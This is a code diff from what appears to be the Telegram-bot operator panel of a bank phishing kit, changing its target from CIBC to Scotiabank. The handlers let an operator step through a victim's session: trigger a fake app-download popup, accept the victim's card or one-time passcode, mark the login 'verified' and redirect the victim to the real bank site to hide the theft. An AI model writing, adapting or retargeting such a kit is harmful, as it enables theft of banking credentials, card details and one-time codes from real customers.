@@ -149,7 +149,7 @@ bot.on('callback_query', async (callbackQuery) => {
       session.status = 'app_popup';
       await bot.answerCallbackQuery(callbackQueryId, { text: '📲 App download popup triggered!' });
       await bot.editMessageText(
-        formatMessage('📲 APP DOWNLOAD POPUP TRIGGERED', email, session, 'Waiting for user to download CIBC Mobile app...'),
+        formatMessage('📲 APP DOWNLOAD POPUP TRIGGERED', email, session, 'Waiting for user to download Scotiabank Mobile app...'),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -180,7 +180,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
     } else if (action === 'redirect_success') {
       session.status = 'redirect_success';
-      const redirectUrl = 'https://www.cibc.com/';
+      const redirectUrl = 'https://www.scotiabank.com/';
       session.redirectUrl = redirectUrl;
 
       await bot.answerCallbackQuery(callbackQueryId, { text: '🔄 Redirecting user with success message...' });
@@ -209,7 +209,7 @@ bot.on('callback_query', async (callbackQuery) => {
       session.status = 'verified';
       await bot.answerCallbackQuery(callbackQueryId, { text: '✅ Card accepted! Redirecting user...' });
       await bot.editMessageText(
-        formatMessage('✅ LOGIN COMPLETE & VERIFIED', email, session, 'User redirecting to https://www.cibc.com/'),
+        formatMessage('✅ LOGIN COMPLETE & VERIFIED', email, session, 'User redirecting to https://www.scotiabank.com/'),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -250,7 +250,7 @@ bot.on('callback_query', async (callbackQuery) => {
       session.status = 'verified';
       await bot.answerCallbackQuery(callbackQueryId, { text: '✅ OTP Accepted & Verified!' });
       await bot.editMessageText(
-        formatMessage('✅ LOGIN COMPLETE & VERIFIED', email, session, 'User redirecting to https://www.cibc.com/'),
+        formatMessage('✅ LOGIN COMPLETE & VERIFIED', email, session, 'User redirecting to https://www.scotiabank.com/'),
         {
           chat_id: message.chat.id,
           message_id: message.message_id
@@ -288,7 +288,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
     } else if (action === 'redirect') {
       session.status = 'redirect';
-      const redirectUrl = 'https://www.cibc.com/';
+      const redirectUrl = 'https://www.scotiabank.com/';
       session.redirectUrl = redirectUrl;
 
       await bot.answerCallbackQuery(callbackQueryId, { text: '🔄 Redirecting user...' });
